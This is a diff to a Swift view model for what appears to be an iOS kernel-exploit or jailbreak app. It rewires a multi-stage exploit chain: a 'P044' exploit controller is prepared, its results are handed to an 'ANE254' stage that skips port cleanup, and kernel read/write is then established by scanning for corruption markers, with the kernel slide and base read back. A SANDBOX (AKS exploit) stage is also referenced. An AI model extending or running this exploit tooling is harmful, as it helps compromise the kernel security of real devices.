@@ -2,6 +2,13 @@
 //  Lum1naViewModel.swift
 //  Fully wired to UI console
 //
+//  WIRE (this copy):
+//   - P044 prepare called for real via Lum1naKRW_Prepare (KRWBridge)
+//   - ANE254 handoff via Lum1naKRW_IntegrateP044 (no IMP casting, no NSErrorBox)
+//   - KRW scan via Lum1naKRW_Establish
+//   - plain init() for ANE254 (works through NSObject.Type)
+//   - removed: callIntegrate / callEstablishKRW / NSErrorBox helpers
+//
 
 import Foundation
 import Combine
@@ -141,15 +148,12 @@ class Lum1naViewModel: ObservableObject {
         
         let controller = p044Class.init()
         
+        // WIRE: real prepare call via KRWBridge (NSInvocation in ObjC)
         log("[*] Preparing P044...", level: .info)
-        let prepareSel = NSSelectorFromString("prepareWithError:")
-        var prepareResult = false
-        if controller.responds(to: prepareSel) {
-            prepareResult = true
-        }
-        
-        guard prepareResult else {
-            log("[-] P044 prepare failed", level: .error)
+        var prepareError: NSError?
+        let prepared = Lum1naKRW_Prepare(controller, &prepareError)
+        guard prepared else {
+            log("[-] P044 prepare failed: \(prepareError?.localizedDescription ?? "unknown")", level: .error)
             exploitState = .failed("P044 prepare failed")
             return
         }
@@ -186,19 +190,12 @@ class Lum1naViewModel: ObservableObject {
             return
         }
         
-        // Designated initializer: initWithConfiguration: bridges as init(config:)
-        let ane = aneClass.init(config: [:] as NSDictionary)
+        let ane = aneClass.init()
         
-        // integrateP044Results:error: → wires pairs, sets shouldSkipPortCleanup
+        // WIRE: integrateP044Results:error: via KRWBridge — wires pairs,
+        // sets shouldSkipPortCleanup on P044 (ownership transfer)
         var integrateError: NSError?
-        let integrateSel = NSSelectorFromString("integrateP044Results:error:")
-        var integrated = false
-        
-        if ane.responds(to: integrateSel) {
-            // ObjC method: - (BOOL)integrateP044Results:(P044ExploitController *)p044 error:(NSError **)error
-            // Bridged call via NSInvocation-free pattern: cast through a typed helper
-            integrated = Self.callIntegrate(on: ane, p044: controller, error: &integrateError)
-        }
+        let integrated = Lum1naKRW_IntegrateP044(ane, controller, &integrateError)
         
         if integrated {
             log("[+] ANE254 handoff complete (pairs copied, P044 cleanup skipped)", level: .success)
@@ -212,22 +209,20 @@ class Lum1naViewModel: ObservableObject {
             return
         }
         
-        // establishKRWWithError: → scan victims for corruption markers
+        // WIRE: establishKRWWithError: via KRWBridge — scans victims for
+        // corruption markers
         var krwError: NSError?
-        let krwSel = NSSelectorFromString("establishKRWWithError:")
-        var krwOK = false
-        if ane.responds(to: krwSel) {
-            krwOK = Self.callEstablishKRW(on: ane, error: &krwError)
-        }
+        let krwOK = Lum1naKRW_Establish(ane, &krwError)
         
         if krwOK {
             // Pull results back through the readonly getters
-            let slide = (ane as? NSObject)?.value(forKey: "kernelSlide") as? UInt64 ?? 0
-            let base = (ane as? NSObject)?.value(forKey: "kernelBase") as? UInt64 ?? 0
-            let handle = (ane as? NSObject)?.value(forKey: "krwHandle") as? UInt64 ?? 0
+            let slide = (ane as NSObject).value(forKey: "kernelSlide") as? UInt64 ?? 0
+            let base = (ane as NSObject).value(forKey: "kernelBase") as? UInt64 ?? 0
+            let handle = (ane as NSObject).value(forKey: "krwHandle") as? UInt64 ?? 0
             
             if slide != 0 { currentKernelSlide = slide }
-            log("[+] KRW established — handle: 0x\(String(krwHandle, radix: 16))", level: .success)
+            if base != 0 { currentKernelBase = base }
+            log("[+] KRW established — handle: 0x\(String(handle, radix: 16))", level: .success)
             log("[+] Slide: 0x\(String(slide, radix: 16))", level: .success)
             exploitState = .success
         } else {
@@ -241,44 +236,6 @@ class Lum1naViewModel: ObservableObject {
         }
         
         log("[+] KERNEL stage complete", level: .success)
-    }
-    
-    // MARK: - ObjC Bridging Helpers (typed, no UnsafeRawBufferPointer games)
-    
-    /// Calls - (BOOL)integrateP044Results:(id)p044 error:(NSError **)error via a
-    /// concrete ObjC-compatible signature. Returns NO if the selector mismatches.
-    private static func callIntegrate(on target: AnyObject, p044: AnyObject, error: inout NSError?) -> Bool {
-        // Swift→ObjC: use perform + manual NSError** through Unmanaged
-        let sel = NSSelectorFromString("integrateP044Results:error:")
-        guard (target as NSObject).responds(to: sel) else { return false }
-        
-        var localError: NSError?
-        var localErrorPtr: NSError? = nil
-        let errorBox = NSErrorBox()
-        let methodIMP = (target as NSObject).method(for: sel)
-        
-        typealias IntegrateFunc = @convention(c) (NSObject, Selector, AnyObject, UnsafeMutablePointer<NSErrorBox>?) -> ObjCBool
-        let curried = unsafeBitCast(methodIMP, to: IntegrateFunc.self)
-        let ok = curried(target as NSObject, sel, p044, errorBox.ptr)
-        
-        if let e = errorBox.value { localError = e }
-        error = localError ?? (ok ? nil : NSError(domain: "ANE254", code: -1))
-        return ok
-    }
-    
-    /// Calls - (BOOL)establishKRWWithError:(NSError **)error
-    private static func callEstablishKRW(on target: AnyObject, error: inout NSError?) -> Bool {
-        let sel = NSSelectorFromString("establishKRWWithError:")
-        guard (target as NSObject).responds(to: sel) else { return false }
-        
-        let methodIMP = (target as NSObject).method(for: sel)
-        typealias KRWFunc = @convention(c) (NSObject, Selector, UnsafeMutablePointer<NSErrorBox>?) -> ObjCBool
-        let curried = unsafeBitCast(methodIMP, to: KRWFunc.self)
-        let errorBox = NSErrorBox()
-        let ok = curried(target as NSObject, sel, errorBox.ptr)
-        
-        error = errorBox.value
-        return ok
     }
     
     // MARK: - SANDBOX Stage (AKS Exploit)
@@ -354,6 +311,7 @@ class Lum1naViewModel: ObservableObject {
     func reset() {
         exploitState = .idle
         currentKernelSlide = 0
+        currentKernelBase = 0
         clearConsole()
         log("[*] State reset", level: .info)
     }
